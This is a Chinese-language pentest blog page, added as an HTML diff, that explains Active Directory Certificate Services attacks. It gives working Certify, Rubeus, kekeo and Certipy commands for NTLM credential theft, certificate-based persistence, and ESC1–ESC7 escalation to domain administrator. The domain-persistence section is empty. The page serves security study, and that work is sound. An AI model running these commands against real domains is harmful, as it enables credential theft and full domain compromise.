@@ -1,0 +1,399 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>ADCS安全问题 - ConsT27's Blog</title>
+    <link href="../../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "ADCS\u5b89\u5168\u95ee\u9898", url: "#_top", children: [
+              {title: "\u76ee\u5f55", url: "#_1" },
+              {title: "\u67e5\u770b\u8bc1\u4e66\u6a21\u7248", url: "#_2" },
+              {title: "\u8bc1\u4e66\u8eab\u4efd\u9a8c\u8bc1", url: "#_3" },
+              {title: "\u679a\u4e3eca", url: "#ca" },
+              {title: "\u653b\u51fb", url: "#_4" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../ARP%E6%AC%BA%E9%AA%97%26DNS%E6%AC%BA%E9%AA%97%26mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/ARP%E6%AC%BA%E9%AA%97%26DNS%E6%AC%BA%E9%AA%97%26mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../ARP%E6%AC%BA%E9%AA%97%26DNS%E6%AC%BA%E9%AA%97%26mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/ARP%E6%AC%BA%E9%AA%97%26DNS%E6%AC%BA%E9%AA%97%26mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/" class="btn btn-xs btn-link">
+        ARP欺骗\&DNS欺骗\&mac泛洪攻击
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="btn btn-xs btn-link">
+        内网渗透
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="adcs">ADCS安全问题</h1>
+<h2 id="_1">目录</h2>
+<ul>
+<li><a href="#查看证书模版">查看证书模版</a></li>
+<li><a href="#证书身份验证">证书身份验证</a></li>
+<li><a href="#枚举ca">枚举ca</a></li>
+<li><a href="#攻击">攻击</a><ul>
+<li><a href="#证书窃取">证书窃取</a><ul>
+<li><a href="#NTLM-Credential-Theft-via-PKINIT--THEFT5">NTLM Credential Theft via PKINIT – THEFT5</a></li>
+</ul>
+</li>
+<li><a href="#权限维持">权限维持</a><ul>
+<li><a href="#Active-User-Credential-Theft-via-Certificates--PERSIST1">Active User Credential Theft via Certificates – PERSIST1</a></li>
+<li><a href="#Machine-Persistence-via-Certificates---PERSIST2">Machine Persistence via Certificates - PERSIST2</a></li>
+</ul>
+</li>
+<li><a href="#域权限提升">域权限提升</a><ul>
+<li><a href="#Misconfigured-Certificate-Templates---ESC1">Misconfigured Certificate Templates - ESC1</a></li>
+<li><a href="#Misconfigured-Certificate-Templates---ESC2">Misconfigured Certificate Templates - ESC2</a></li>
+<li><a href="#Misconfigured-Enrollment-Agent-Templates---ESC3">Misconfigured Enrollment Agent Templates - ESC3</a></li>
+<li><a href="#Vulnerable-Certificate-Template-Access-Control---ESC4">Vulnerable Certificate Template Access Control - ESC4</a></li>
+<li><a href="#CA-EDITF_ATTRIBUTESUBJECTALTNAME2---ESC6">CA EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6</a></li>
+<li><a href="#Vulnerable-Certificate-Authority-Access-Control---ESC7">Vulnerable Certificate Authority Access Control - ESC7</a></li>
+</ul>
+</li>
+<li><a href="#域权限维持">域权限维持</a></li>
+</ul>
+</li>
+</ul>
+<p>Active Directory Certificate Services 证书服务。ADCS 并不是默认安装但在大型企业域中通常被广泛部署</p>
+<p>adcs大量攻击面存在于证书模版中，存储为</p>
+<pre><code class="language-纯文本">CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=,DC= ，
+
+</code></pre>
+<h2 id="_2">查看证书模版</h2>
+<p>查看某个用户或用户组对某个证书模版拥有的权限</p>
+<pre><code class="language-纯文本">Import-Module ActiveDirectory
+cd AD:
+$Acl = Get-Acl 'CN=User,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=pentest,DC=com'
+$Acl.Access.Count
+$Acl.Access | where IdentityReference -match 'Domain Users'
+</code></pre>
+<p><img alt="" src="../image/image_Pdr_D5x-cK.png" /></p>
+<p>或者 <code>certtmpl.msc</code>，右键点击 “模板”，选择 “属性”，然后查看 “ 安全” 选项卡</p>
+<p><img alt="" src="../image/image_CENeq20za5.png" /></p>
+<p>或者certsrv.msc，右键单击选中的 CA，选择 “属性”，然后查看 “ 安全” 选项卡</p>
+<p><img alt="" src="../image/image_LvYCNFtwjx.png" /></p>
+<h2 id="_3">证书身份验证</h2>
+<p>AD 默认支持两种协议的证书身份验证：Kerberos 协议和安全信道（Secure Channel，Schannel）。
+PKINT（Public Key Cryptography for Initial Authentication ，“用于初始认证的公钥密码体制”）被用于kerberos协议中定义证书身份验证过程。</p>
+<p>Secure Channel（Schannel）是 Windows 在建立 TLS/SSL 连接时利用的 SSP。Schannel 支持客户端身份验证（以及许多其他功能），使远程服务器能够验证连接用户的身份。它使用 PKI 完成此操作，证书是主要凭据。在 TLS 握手期间，服务器要求客户端请提供证书以进行身份验证。客户端先前已从服务器信任的 CA 颁发客户端身份验证证书，然后将其证书发送到服务器。然后，服务器验证证书是否正确，并在一切正常的情况下授予用户访问权限。</p>
+<h2 id="ca">枚举ca</h2>
+<p>如果想要枚举企业 CA 及其设置，可以以 <code>CN=Configuration,DC=&lt;DOMAIN&gt;,DC=&lt;COM&gt;</code> 为 BaseDN，以 <code>(objectCategory=pKIEnrollmentService)</code> 为过滤器查询 LDAP。结果将识别 CA 服务器的 DNS 主机名、CA 名称本身、证书开始和结束日期、各种标志、已发布的证书模板等各种属性信息。</p>
+<pre><code class="language-powershell">$baseDN = &quot;CN=Configuration,DC=&lt;DOMAIN&gt;,DC=&lt;COM&gt;&quot;
+$filter = &quot;(objectCategory=pKIEnrollmentService)&quot;
+Get-ADObject -SearchBase $baseDN -LDAPFilter $filter
+</code></pre>
+<p>Certify 可以枚举有关 AD CS 环境的有用配置和基础结构信息，使用其 <code>cas</code> 命令可以枚举受信任的根 CA 证书、由 <code>NTAuthCertificates</code> 对象定义的证书以及有关企业 CA 的各种信息：</p>
+<p><a href="https://github.com/GhostPack/Certify" title="https://github.com/GhostPack/Certify">https://github.com/GhostPack/Certify</a></p>
+<pre><code class="language-纯文本">Certify.exe cas
+</code></pre>
+<p><img alt="" src="../image/image_1tkNYaiizC.png" /></p>
+<p>要获取有关每个可用证书模板的详细信息，可以使用 <code>certutil -v -dstemplate</code> 命令</p>
+<p><img alt="" src="../image/image_2vcitEw-ns.png" /></p>
+<h2 id="_4">攻击</h2>
+<h3 id="_5">证书窃取</h3>
+<h4 id="ntlm-credential-theft-via-pkinit-theft5"><a href="https://tttang.com/archive/1593/#toc_045-ntlm-credential-theft-via-pkinit-theft5" title="NTLM Credential Theft via PKINIT – THEFT5">NTLM Credential Theft via PKINIT – THEFT5</a></h4>
+<p>当使用证书进行 Kerberos PKINIT 身份验证的时候，返回的票据的 PAC 包里面包含用户的 NTLM 凭据。获取这个 NTLM 凭据涉及解密 PAC_CREDENTIAL_DATA 结构，mimikatz和kekeo实现了该点。</p>
+<pre><code class="language-纯文本">kekeo.exe &quot;tgt::pac /caname:pentest-DC01-CA /subject:Marcus /castore:current_user /domain:pentest.com&quot; exit
+</code></pre>
+<p><img alt="" src="../image/image_ewrLftdIW2.png" /></p>
+<p>即使用户将密码改了，通过证书也随时都可以获取 NTLM</p>
+<h3 id="_6">权限维持</h3>
+<h4 id="active-user-credential-theft-via-certificates-persist1">Active User Credential Theft via Certificates – PERSIST1</h4>
+<p>如果有相应的证书模版，且已知当前用户密码，则可以用证书申请tgt来达到权限维持，即使用户重置密码，该tgt也依旧有效，此方法不会经过lsass可以规避一些edr检测。</p>
+<pre><code class="language-纯文本">所使用的证书模板需要具有以下属性：
+
+该证书模板公开注册。
+允许域用户（或用户所属的组）进行注册。
+至少具有以下任何可启用域身份验证的 EKU：
+Smart Card Logon (1.3.6.1.4.1.311.20.2.2)
+Client Authentication (1.3.6.1.5.5.7.3.2) ○
+PKINIT Client Authentication (1.3.6.1.5.2.3.4)
+Any Purpose EKU (2.5.29.37.0)
+No EKU set. i.e., this is a (subordinate) CA certificate.
+不需要证书管理员批准或 “授权签名” 签发要求。
+
+幸运的是，有一个已发布的模板允许这样做，即 User 模板。但是，虽然此模板是 AD CS 的默认模板，但某些环境可能会禁用它。
+</code></pre>
+<p>查找符合上述条件的模版</p>
+<pre><code class="language-纯文本">Certify.exe find /clientauth
+</code></pre>
+<p><img alt="" src="../image/image_-aJpFTgPhD.png" /></p>
+<p>申请证书，以User模版为例（需要注意的是，要想成功使用 Certify 的 <code>request</code> 命令，需要将 Certify 项目中生产的 DLL 依赖 Interop.CERTENROLLLib.dll 复制到 Certify.exe 的相同目录下。）</p>
+<pre><code class="language-纯文本">Certify.exe request /ca:DC01.pentest.com\pentest-DC01-CA /template:User
+</code></pre>
+<p><img alt="" src="../image/image_DKs-Ckhovw.png" /></p>
+<p>成功执行后，将输出证书 + 私钥的 .pem 格式的文本块，需用openssl命令转换为.pfx格式，才能给rubeus用。</p>
+<p>执行这个指令后会提示您输入密码，以保护生成的 .pfx 文件。</p>
+<pre><code class="language-纯文本">openssl pkcs12 -in cert.pem -keyex -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out cert.pfx
+</code></pre>
+<p>通过rubeus申请tgt并注入内存</p>
+<pre><code class="language-纯文本">Rubeus.exe asktgt /user:Marcus /certificate:C:\Users\Marcus\cert.pfx /password:Passw0rd /ptt
+</code></pre>
+<h4 id="machine-persistence-via-certificates-persist2"><a href="https://tttang.com/archive/1593/#toc_052-machine-persistence-via-certificates-persist2" title="Machine Persistence via Certificates - PERSIST2">Machine Persistence via Certificates - PERSIST2</a></h4>
+<p>如果攻击者提升了权限到system，可以通过默认的 Machine 模板为当前机器账户注册证书,并获取tgt</p>
+<pre><code class="language-纯文本">Certify.exe request /ca:DC01.pentest.com\pentest-DC01-CA /template:Machine /machine
+
+</code></pre>
+<p>后续操作与上一小节一致，用kekeo注入tgt到内存。</p>
+<h3 id="_7">域权限提升</h3>
+<h4 id="misconfigured-certificate-templates-esc1"><a href="https://tttang.com/archive/1593/#toc_061-misconfigured-certificate-templates-esc1" title="Misconfigured Certificate Templates - ESC1">Misconfigured Certificate Templates - ESC1</a></h4>
+<p>证书模版有一组特定的设置，使它们极易被攻击者利用，以实现域权限提升。下面我们来介绍第一种配置情况（ESC1）：</p>
+<pre><code class="language-纯文本">企业 CA 授予低特权用户注册权限。
+CA 证书管理程序批准被禁用。
+无需授权签名。
+过于宽松的证书模板安全描述符会向低特权用户授予证书注册权限。
+证书模板定义了启用域身份验证的 EKU。
+证书模板允许请求者在 CSR 中指定 subjectAltName。
+</code></pre>
+<p>注意最后一点，这个意思是在通过证书进行身份验证时，可以指定请求者的身份为任何人（例如域管）。</p>
+<p>证书模板在其 AD 对象的 <a href="https://docs.microsoft.com/zh-tw/openspecs/windows_protocols/ms-crtd/1192823c-d839-4bc3-9b6b-fa8c53507ae1" title="mspki-certificate-name-flag">mspki-certificate-name-flag</a> 属性中指定请求者是否可以在其中指定 SAN。<code>mspki-certificate-name-flag</code> 属性是位掩码，如果存在 <code>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</code> 标志，则请求者可以指定 SAN。在证书模板控制台 MMC 管理单元中，此值在模板的 “属性” 的 “使用者名称” 选项卡中进行设置，如下图所示，勾选 “在请求中提供(S)” 即可。</p>
+<p><img alt="" src="../image/image_iOonZ9HY_C.png" /></p>
+<p>上述这些配置允许低权限用户使用任意的 SAN 请求证书，导致低权限用户能够通过 Kerberos 或 SChannel 以域中的任何主体身份进行身份验证。</p>
+<p>枚举存在危险的证书模版</p>
+<pre><code class="language-纯文本">Certify.exe find /vulnerable
+</code></pre>
+<p><img alt="" src="../image/image_E7DoqcEx87.png" /></p>
+<p>如上图所示，证书模板 VulnTemplate 在 <code>msPKI-Certificate-Name-Flag</code> 属性中启用了 <code>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</code> 标志
+并且具有客户端身份验证的 EKU（Extended Key Usage,扩展密钥用途），pkiextendedkeyuseage存在客户端身份验证
+并授予所有域用户注册权限。(enrollment rights存在 domain users）</p>
+<p>通过certify请求tgt</p>
+<pre><code class="language-纯文本">Certify.exe request /ca:DC01.pentest.com\pentest-DC01-CA /template:VulnTemplate /altname:PENTEST\Administrator
+</code></pre>
+<p>转为.pfx后给rubeus利用。</p>
+<pre><code class="language-纯文本">Rubeus.exe asktgt /user:Administrator /certificate:C:\Users\Marcus\cert.pfx /password:Passw0rd /ptt
+</code></pre>
+<h4 id="misconfigured-certificate-templates-esc2"><a href="https://tttang.com/archive/1593/#toc_062-misconfigured-certificate-templates-esc2" title="Misconfigured Certificate Templates - ESC2">Misconfigured Certificate Templates - ESC2</a></h4>
+<p>是esc1的变体</p>
+<pre><code class="language-纯文本">企业 CA 授予低特权用户注册权限。细节与 ESC1 相同。
+CA 证书管理程序批准被禁用。细节与 ESC1 相同。
+无需授权签名。细节与 ESC1 相同。
+过于宽松的证书模板安全描述符会向低特权用户授予证书注册权限。细节与 ESC1 相同。
+证书模板定义了 Any Purpose 类型的 EKU 或 SubCA 类型的 EKU。前者 Any Purpose 指证书可以用于任何目的，后者 SubCA 指证书没有 EKU，相当于从属 CA 的证书。
+
+</code></pre>
+<p>攻击者可以将具有 Any Purpose EKU 的证书用于任何目的，这包括客户端身份验证、服务器身份验证、代码签名等。可以用于获取tgt进行持久化等操作，感觉危害度没esc1高</p>
+<pre><code class="language-纯文本">Certify.exe find /vulnerable
+</code></pre>
+<p><img alt="" src="../image/image_ZImR8sM0l4.png" /></p>
+<h4 id="misconfigured-enrollment-agent-templates-esc3"><a href="https://tttang.com/archive/1593/#toc_063-misconfigured-enrollment-agent-templates-esc3" title="Misconfigured Enrollment Agent Templates - ESC3">Misconfigured Enrollment Agent Templates - ESC3</a></h4>
+<p>滥用eku中的“注册代理” 导致的权限提升。 注册代理：允许委托人代表另一个用户注册证书。</p>
+<p>完成此攻击，CA 需要至少以下两组匹配条件的证书模板：</p>
+<pre><code class="language-纯文本">条件1:
+允许低权限用户注册代理证书。
+企业 CA 授予低特权用户注册权限。细节与 ESC1 相同。
+CA 证书管理程序批准被禁用。细节与 ESC1 相同。
+无需授权签名。细节与 ESC1 相同。
+过于宽松的证书模板安全描述符会向低特权用户授予证书注册权限。细节与 ESC1 相同。
+证书模板定义了证书申请代理 EKU。证书申请代理 OID（1.3.6.1.4.1.311.20.2.1）允许代表其他主体请求其他证书模板。
+
+条件 2：
+另一个模板需要允许低权限用户使用注册代理证书代表另一个用户来请求证书，并且该模板定义了一个允许域身份验证的 EKU。
+企业 CA 授予低特权用户注册权限。细节与 ESC1 相同。
+CA 证书管理程序批准被禁用。细节与 ESC1 相同。
+模板架构版本 1 或大于 2 并在发布要求中指定了需要证书申请代理 EKU 的应用程序策略。关于发布要求的细节可以参考前文。
+证书模板定义了启用域身份验证的 EKU。
+注册代理限制未在 CA 上实施。
+</code></pre>
+<p>以下是匹配条件 1 的模板的示例：</p>
+<p><img alt="" src="https://storage.tttang.com/media/attachment/2022/05/19/5af0cf45-c61d-4b38-9c9c-0a251c033709.png" /></p>
+<p>以下是匹配条件 2 的模板的示例：</p>
+<p><img alt="" src="https://storage.tttang.com/media/attachment/2022/05/19/69374348-f15b-4d10-88db-764ef37c0039.png" /></p>
+<p>先请求注册代理证书（条件1模版）</p>
+<pre><code class="language-纯文本">Certify.exe request /ca:DC01.pentest.com\pentest-DC01-CA /template:Vuln-EnrollmentAgent
+</code></pre>
+<p>将得到的注册代理证书使用 openssl 转换为 .pfx 格式，然后，用它来代表另一个用户（例如域管理员用户）向允许域身份验证的模板发出证书注册请求，相关命令如下。</p>
+<pre><code class="language-纯文本">Certify.exe request /ca:DC01.pentest.com\pentest-DC01-CA /template:Vuln-EnrollmentAgent-AuthorizedSignatures /onbehalfof:PENTEST\Administrator /enrollcert:Vuln-EnrollmentAgentCert.pfx /enrollcertpw:Passw0rd
+</code></pre>
+<p>如上图所示，成功为域管理员用户 Administrator 注册了一个证书。在使用 openssl 转换为 .pfx 格式后，这个证书允许我们通过以 Administrator 的身份请求一个 TGT</p>
+<pre><code class="language-纯文本">Rubeus.exe asktgt /user:Administrator /certificate:C:\Users\Marcus\cert.pfx /password:Passw0rd /ptt
+</code></pre>
+<h4 id="vulnerable-certificate-template-access-control-esc4"><a href="https://tttang.com/archive/1593/#toc_064-vulnerable-certificate-template-access-control-esc4" title="Vulnerable Certificate Template Access Control - ESC4">Vulnerable Certificate Template Access Control - ESC4</a></h4>
+<p>如果用户对ca模版有高权限acl，就可以干很多坏事。</p>
+<p>例子：如果攻击者对模板对象拥有 WriteProperty 权限，则其可以修改模板 AD 对象属性，则他们可以直接将错误配置推送到不易受攻击的模板，例如通过为允许域身份验证的模板在 <code>mspki-certificate-name-flag</code> 属性中启用 <code>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</code> 标志，这会导致与 “Misconfigured Certificate Templates - ESC1” 相同的滥用场景。</p>
+<p>Certify 的 <code>find</code> 命令会枚举所有证书模板的访问控制条目（BloodHound 团队也在积极集成此类枚举），如下图所示。</p>
+<pre><code class="language-纯文本">Certify.exe find
+
+</code></pre>
+<p><img alt="" src="../image/image_4sZOISi3Yp.png" /></p>
+<p>可见模版属性可被修改</p>
+<p>看看具体可以修改哪些条目</p>
+<pre><code class="language-纯文本">Import-Module ActiveDirectory
+(Get-Acl -Path &quot;AD:CN=user,CN=certificate templates,CN=public key services,CN=services,CN=configuration,DC=ez,DC=lab&quot;).Access
+</code></pre>
+<p><img alt="" src="../image/image_IWy5ZsYi6s.png" /></p>
+<p>objectType显示的是可以修改的属性。如果是msPKI-Certificate-Name-Flag的guid就可以直接修改了.
+如果objectType全是0，则表示任意属性均可修改。</p>
+<p>添加esc1中的敏感条目：</p>
+<p><a href="https://github.com/ly4k/Certipy" title="https://github.com/ly4k/Certipy">https://github.com/ly4k/Certipy</a> certify python版+强化版</p>
+<pre><code class="language-纯文本">#保留旧ESC4模板配置并修改ESC4模板
+certipy template -u hack@lhc.local -p 123@Qwe -template ESC4_1 -save-old
+#利用新ESC4证书模板申请证书
+certipy req -u hack@lhc.local -p 123@Qwe -ca Lhc-CS2016-CA -target-ip 10.211.55.20 -template ESC4_1 -upn administrator@lhc.local
+#身份验证
+certipy auth -pfx administrator.pfx -dc-ip 10.211.55.18
+#模板复原
+certipy template -u hack@lhc.local -p 123@Qwe -template ESC4 -configuration ESC4.json
+
+</code></pre>
+<p>或者</p>
+<p><a href="https://github.com/fortalice/modifyCertTemplate" title="https://github.com/fortalice/modifyCertTemplate">https://github.com/fortalice/modifyCertTemplate</a></p>
+<p>这个工具还可以查看模版的属性以及acl，比较综合</p>
+<pre><code class="language-纯文本">python3 modifyCertTemplate.py -template KerberosAuthentication -add enrollee_supplies_subject -property msPKI-Certificate-Name-Flag ez.lab/administrator:pass 
+
+</code></pre>
+<p>然后参照esc1进行攻击即可。</p>
+<h4 id="ca-editf_attributesubjectaltname2-esc6"><a href="https://tttang.com/archive/1593/#toc_066-ca-editf_attributesubjectaltname2-esc6" title="CA EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6">CA EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6</a></h4>
+<p>EDITF_ATTRIBUTESUBJECTALTNAME2 的滥用来启用 SAN (主题备用名)，从而允许用户在申请证书时说明自己身份，从而达到与启用 “Misconfigured Certificate Templates - ESC1” 中所述的危害一样</p>
+<p>与EDITF_ATTRIBUTESUBJECTALTNAME2 有关,开启命令</p>
+<pre><code class="language-纯文本">#开启EDITF_ATTRIBUTESUBJECTALTNAME2
+certutil -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
+#重启certsvc服务
+net stop certsvc
+net start certsvc
+</code></pre>
+<pre><code class="language-纯文本">企业 CA 授予低权限用户请求权限（默认）；
+模板中 CA 管理员审批未启用（默认）；
+模板中不需要授权的签名（默认）；
+CA+EDITF_ATTRIBUTESUBJECTALTNAME2（以下为开启命令）
+</code></pre>
+<p><img alt="" src="../image/image_UE3i263e-Q.png" /></p>
+<pre><code class="language-纯文本">Certify.exe request /ca:DC01.pentest.com\pentest-DC01-CA /template:User /altname:PENTEST\Administrator
+</code></pre>
+<p>获得admin的证书</p>
+<h4 id="vulnerable-certificate-authority-access-control-esc7">Vulnerable Certificate Authority Access Control - ESC7</h4>
+<p>证书颁发机构也有一些acl，普通用户拥有这些权限也能进行域权限提升</p>
+<p><img alt="" src="../image/image_0m6my97VO_.png" /></p>
+<p>这里的两个主要权限是 “管理 CA”（ManageCA）权限和 “颁发和管理证书”（ManageCertificates）权限，拥有这两个权限的用户分别对应于 “CA 管理员” 和 “证书管理员”（有时称为 CA 官员）。</p>
+<p><strong>1.对于“管理 CA”（ManageCA）权限</strong></p>
+<pre><code class="language-纯文本">Import-Module -Name PSPKI
+Get-CertificationAuthority -ComputerName dc01.pentest.com | Get-CertificationAuthorityAcl | select -expand Access
+</code></pre>
+<p><img alt="" src="../image/image_RxWPIEMv6j.png" /></p>
+<p>开启<code>EDITF_ATTRIBUTESUBJECTALTNAME2</code> 位以允许在任何模板注册请求中设置 SAN，用于完成esc6攻击</p>
+<pre><code class="language-纯文本">Import-Module PSPKI
+$ConfigReader = New-Object SysadminsLV.PKI.Dcom.Implementations.CertSrvRegManagerD &quot;DC01.pentest.com&quot;
+$ConfigReader.SetRootNode($true)
+$ConfigReader.GetConfigEntry(&quot;EditFlags&quot;, &quot;PolicyModules\CertificateAuthority_MicrosoftDefault.Policy&quot;)
+$ConfigReader.SetConfigEntry(1376590, &quot;PolicyModules\CertificateAuthority_MicrosoftDefault.Policy&quot;)
+</code></pre>
+<p><strong>2.对于 “颁发和管理证书”（ManageCertificates）权限</strong></p>
+<p>一个名为 “ApproveReqTemplate” 的模板，其允许域身份验证并且在<code>mspki-certificate-name-flag</code> 属性中设置了 <code>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</code> 标志。正常情况下我们可以按照前文 “Misconfigured Certificate Templates - ESC1” 的方法为域管理员的申请证书，但是该模板在发布要求中开启了 “CA 证书管理程序批准(C)” 保护，如下图所示。</p>
+<p><img alt="" src="../image/image_KfUGMhEdlD.png" /></p>
+<p>那么我们所有针对该模板的注册请求都将被挂起，直到管理员在 certsrv.msc 的 “挂起的申请” 中对该请求予以 “颁发” 或 “拒绝”。</p>
+<p>但是如果我们有ManageCertificates权限（查询命令如下），我们就可以自主让该申请通过</p>
+<pre><code class="language-纯文本">Import-Module -Name PSPKI
+Get-CertificationAuthority -ComputerName dc01.pentest.com | Get-CertificationAuthorityAcl | select -expand Access
+</code></pre>
+<p>照样请求证书，因为注册被挂起，我们只能获得一个request id</p>
+<pre><code class="language-纯文本">Certify.exe request /ca:DC01.pentest.com\pentest-DC01-CA /template:ApproveReqTemplate /altname:PENTEST\Administrator
+</code></pre>
+<p><img alt="" src="../image/image_bXQJrYlyUs.png" /></p>
+<p>再通过如下命令让申请通过（request id 为56的申请通过）</p>
+<pre><code class="language-纯文本">Import-Module PSPKI
+Get-CertificationAuthority -ComputerName dc01.pentest.com | Get-PendingRequest -RequestID 56 | Approve-CertificateRequest
+</code></pre>
+<p>再次申请证书，指定request id为先前的56，即可获得admin证书</p>
+<pre><code class="language-纯文本">Certify.exe request /ca:DC01.pentest.com\pentest-DC01-CA /id:56
+
+</code></pre>
+<h3 id="_8">域权限维持</h3>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../ARP%E6%AC%BA%E9%AA%97%26DNS%E6%AC%BA%E9%AA%97%26mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/ARP%E6%AC%BA%E9%AA%97%26DNS%E6%AC%BA%E9%AA%97%26mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../ARP%E6%AC%BA%E9%AA%97%26DNS%E6%AC%BA%E9%AA%97%26mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/ARP%E6%AC%BA%E9%AA%97%26DNS%E6%AC%BA%E9%AA%97%26mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/" class="btn btn-xs btn-link">
+        ARP欺骗\&DNS欺骗\&mac泛洪攻击
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="btn btn-xs btn-link">
+        内网渗透
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
